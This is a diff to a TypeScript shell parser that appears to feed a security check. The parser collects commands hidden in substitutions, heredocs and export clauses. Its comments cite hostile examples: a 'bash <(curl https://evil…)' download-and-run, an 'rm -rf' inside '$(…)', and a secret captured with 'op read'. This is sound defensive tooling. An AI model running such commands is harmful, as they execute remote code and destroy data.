@@ -46,6 +46,16 @@ export interface ShellWord {
 	variables: string[];
 	/** True when the word contains a command substitution. */
 	substitution: boolean;
+	/**
+	 * The commands whose output this word takes in, through `$(…)` or `<(…)`.
+	 * Only the substitution's own level: a command nested deeper hangs off a
+	 * word of the command that contains it. Every one of them is also in the
+	 * flat list, marked `nested`.
+	 *
+	 * The floor needs the link, because a secret a nested command prints lands
+	 * wherever this word lands: a capture, a request header, or a print.
+	 */
+	commands: ShellCommand[];
 }
 
 export interface ShellRedirect {
@@ -60,6 +70,9 @@ export interface ShellRedirect {
 	 *  stderr, "&" for both streams. */
 	fd: string;
 	target: ShellWord;
+	/** A heredoc's body. An unquoted delimiter expands it, so its variables
+	 *  and substitutions run like any other word's. */
+	body?: ShellWord;
 }
 
 export interface ShellAssign {
@@ -182,29 +195,29 @@ function parserMessage(err: unknown): string {
 	return err instanceof Error ? err.message : String(err);
 }
 
+/**
+ * Collect one statement into `out` and return the commands it produced at its
+ * own level. Commands inside its substitutions go into `out` too, marked
+ * nested, but hang off the word that contains them rather than being returned.
+ */
 // biome-ignore lint/suspicious/noExplicitAny: untyped AST
-function collectStmt(stmt: any, join: ShellJoin, nested: boolean, source: string, out: ShellCommand[]): void {
+function collectStmt(stmt: any, join: ShellJoin, nested: boolean, source: string, out: ShellCommand[]): ShellCommand[] {
 	const cmd = stmt?.Cmd;
 	const type = cmd ? nodeType(cmd) : "";
 	if (type === "BinaryCmd") {
-		collectStmt(cmd.X, join, nested, source, out);
-		collectStmt(cmd.Y, joinOf(cmd.Op), nested, source, out);
-		return;
+		return [...collectStmt(cmd.X, join, nested, source, out), ...collectStmt(cmd.Y, joinOf(cmd.Op), nested, source, out)];
 	}
-	const redirects = (stmt?.Redirs ?? []).map((redir: any) => readRedirect(redir, source));
-	if (type === "CallExpr") {
-		const words: ShellWord[] = (cmd.Args ?? []).map((word: any) => readWord(word, source));
-		const assigns: ShellAssign[] = (cmd.Assigns ?? []).map((assign: any) => ({
-			name: assign.Name?.Value ?? "",
-			value: assign.Value ? readWord(assign.Value, source) : undefined,
-		}));
-		out.push({ words, assigns, redirects, join, nested });
-		// A substitution runs its own commands, and they are commands: the
-		// delete in `echo "$(rm -rf build)"` is a delete. One walk over the
-		// whole call rather than one per word, because each walk crosses into
-		// the Go build and that cost is per node visited, not per call.
-		collectSubstitutions(cmd, source, out);
-		return;
+	const redirs = stmt?.Redirs ?? [];
+	if (type === "CallExpr" || type === "DeclClause") {
+		// Pushed before its words are read, so the command comes ahead of the
+		// commands in its substitutions: `echo "$(rm -rf build)"` lists echo,
+		// then rm.
+		const command: ShellCommand = { words: [], assigns: [], redirects: [], join, nested };
+		out.push(command);
+		if (type === "CallExpr") readCall(cmd, command, source, out);
+		else readDecl(cmd, command, source, out);
+		command.redirects = redirs.map((redir: any) => readRedirect(redir, source, out));
+		return [command];
 	}
 	// Every other command shape: a subshell, a block, a loop, a conditional, a
 	// function, `time`, `coproc`, or whatever the grammar gains next. The
@@ -212,17 +225,59 @@ function collectStmt(stmt: any, join: ShellJoin, nested: boolean, source: string
 	// shapes, because an enumeration that misses one drops every command under
 	// it silently — which is how `time rm -rf build` came to summarize as
 	// nothing at all.
-	if (redirects.length > 0) out.push({ words: [], assigns: [], redirects, join, nested });
+	const own: ShellCommand[] = [];
+	if (redirs.length > 0) {
+		const carrier: ShellCommand = { words: [], assigns: [], redirects: [], join, nested };
+		out.push(carrier);
+		own.push(carrier);
+		carrier.redirects = redirs.map((redir: any) => readRedirect(redir, source, out));
+	}
 	// A compound's header is not a statement and carries commands of its own:
 	// the `$(ls)` of `for f in $(ls)`. Statements own the substitutions inside
-	// them, so this walk stops at each one.
+	// them, so this walk stops at each one. These belong to no word, so a
+	// caller finds them only in the flat list.
 	const substitutions = collectSubstitutions(cmd, source, out);
 	const inner = shallowStmts(cmd);
-	for (const stmt of inner) collectStmt(stmt, join, nested, source, out);
+	for (const stmt of inner) own.push(...collectStmt(stmt, join, nested, source, out));
 	// Nothing read at all is still a command that ran.
-	if (inner.length === 0 && substitutions === 0 && cmd) {
-		out.push({ words: [], assigns: [], redirects: [], join, nested, unreadShape: type });
+	if (inner.length === 0 && substitutions.length === 0 && cmd) {
+		const marker: ShellCommand = { words: [], assigns: [], redirects: [], join, nested, unreadShape: type };
+		out.push(marker);
+		own.push(marker);
 	}
+	return own;
+}
+
+// biome-ignore lint/suspicious/noExplicitAny: untyped AST
+function readCall(cmd: any, command: ShellCommand, source: string, out: ShellCommand[]): void {
+	command.assigns = (cmd.Assigns ?? []).map((assign: any) => readAssign(assign, source, out));
+	command.words = (cmd.Args ?? []).map((word: any) => readWord(word, source, out));
+}
+
+/**
+ * `declare`, `local`, `export`, `readonly`, `typeset`: the parser reads their
+ * arguments as assignments, which is what the shell does. The verb becomes the
+ * first word, a flag such as `-x` a word after it, and `NAME=value` an
+ * assignment, so `export KEY="$(op read …)"` is the capture it looks like.
+ */
+// biome-ignore lint/suspicious/noExplicitAny: untyped AST
+function readDecl(cmd: any, command: ShellCommand, source: string, out: ShellCommand[]): void {
+	const variant = cmd.Variant?.Value ?? "declare";
+	command.words = [{ source: variant, value: variant, literal: true, variables: [], substitution: false, commands: [] }];
+	for (const assign of cmd.Args ?? []) {
+		if (assign.Naked && !assign.Name) command.words.push(readWord(assign.Value, source, out));
+		else command.assigns.push(readAssign(assign, source, out));
+	}
+}
+
+// biome-ignore lint/suspicious/noExplicitAny: untyped AST
+function readAssign(assign: any, source: string, out: ShellCommand[]): ShellAssign {
+	const value = assign.Value ? readWord(assign.Value, source, out) : undefined;
+	// `arr=(a $(b))` and `arr[$(i)]=x` carry commands outside the value word.
+	// They belong to no word, so they are collected into the flat list only.
+	if (assign.Array) collectSubstitutions(assign.Array, source, out);
+	if (assign.Index) collectSubstitutions(assign.Index, source, out);
+	return { name: assign.Name?.Value ?? "", value };
 }
 
 /**
@@ -251,16 +306,17 @@ function shallowStmts(cmd: any): any[] {
 }
 
 /**
- * Every substitution inside a node, as commands, and how many statements they
- * contributed.
+ * Every substitution inside a node, collected as commands, and the ones at the
+ * substitution's own level returned.
  *
  * Both spellings count. `$(…)` runs its commands for their output; `<(…)` runs
  * them for a file descriptor, which is how `bash <(curl https://evil…)` runs a
  * download without ever naming a pipe.
  */
 // biome-ignore lint/suspicious/noExplicitAny: untyped AST
-function collectSubstitutions(node: any, source: string, out: ShellCommand[]): number {
-	let collected = 0;
+function collectSubstitutions(node: any, source: string, out: ShellCommand[]): ShellCommand[] {
+	const own: ShellCommand[] = [];
+	if (!node) return own;
 	syntax.Walk(node, (inner: unknown) => {
 		if (!inner) return true;
 		const type = nodeType(inner);
@@ -269,14 +325,11 @@ function collectSubstitutions(node: any, source: string, out: ShellCommand[]): n
 		if (type === "Stmt") return false;
 		if (type !== "CmdSubst" && type !== "ProcSubst") return true;
 		// biome-ignore lint/suspicious/noExplicitAny: untyped AST
-		for (const stmt of (inner as any).Stmts ?? []) {
-			collectStmt(stmt, "sequence", true, source, out);
-			collected += 1;
-		}
+		for (const stmt of (inner as any).Stmts ?? []) own.push(...collectStmt(stmt, "sequence", true, source, out));
 		// Its own statements were just collected, and each recurses on its own.
 		return false;
 	});
-	return collected;
+	return own;
 }
 
 const joinOf = (op: number): ShellJoin => {
@@ -290,25 +343,29 @@ const joinOf = (op: number): ShellJoin => {
 };
 
 // biome-ignore lint/suspicious/noExplicitAny: untyped AST
-function readRedirect(redir: any, source: string): ShellRedirect {
+function readRedirect(redir: any, source: string, out: ShellCommand[]): ShellRedirect {
 	const op = redir.Op as number;
 	const duplicate = op === REDIR.dupOut || op === REDIR.dupIn;
 	const here = op === REDIR.hereString || op === REDIR.heredoc || op === REDIR.heredocDash;
 	const direction: "in" | "out" = here || op === REDIR.in || op === REDIR.dupIn ? "in" : "out";
 	const both = op === REDIR.both || op === REDIR.bothAppend;
-	return {
+	const redirect: ShellRedirect = {
 		direction,
 		append: op === REDIR.append || op === REDIR.bothAppend,
 		duplicate,
 		here,
 		fd: both ? "&" : (redir.N?.Value ?? ""),
-		target: readWord(redir.Word, source),
+		target: readWord(redir.Word, source, out),
 	};
+	// The body of `cat <<EOF` runs its `$(…)` when the delimiter is unquoted.
+	// Left unread, a heredoc body hid every command substituted into it.
+	if (redir.Hdoc) redirect.body = readWord(redir.Hdoc, source, out);
+	return redirect;
 }
 
 // biome-ignore lint/suspicious/noExplicitAny: untyped AST
-function readWord(word: any, source: string): ShellWord {
-	if (!word) return { source: "", value: "", literal: true, variables: [], substitution: false };
+function readWord(word: any, source: string, out: ShellCommand[]): ShellWord {
+	if (!word) return { source: "", value: "", literal: true, variables: [], substitution: false, commands: [] };
 	const variables: string[] = [];
 	let literal = true;
 	let substitution = false;
@@ -345,7 +402,10 @@ function readWord(word: any, source: string): ShellWord {
 			.join("");
 
 	const value = render(word.Parts ?? []);
-	return { source: sliceOf(word, source), value, literal, variables, substitution };
+	// One walk per word visits each node once, as one walk per call did: the
+	// words of a call are disjoint subtrees.
+	const commands = collectSubstitutions(word, source, out);
+	return { source: sliceOf(word, source), value, literal, variables, substitution, commands };
 }
 
 // biome-ignore lint/suspicious/noExplicitAny: untyped AST
